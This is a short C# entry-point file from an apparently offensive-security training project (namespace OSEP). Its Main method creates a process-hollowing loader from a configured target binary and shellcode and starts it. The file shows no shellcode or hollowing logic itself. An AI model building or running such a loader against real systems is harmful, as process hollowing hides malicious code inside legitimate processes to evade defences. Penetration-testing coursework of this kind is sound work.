using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static OSEP.Entry;

namespace OSEP
{

    internal class Entry
    {
        
        static void Main(string[] args)
        {
            
            CreateHollowProcess chp = new CreateHollowProcess(CONFIG.HOLLOW_BINARY_TARGET, CONFIG.SHELLCODE);
            chp.StartProcess();

        }
    }
}
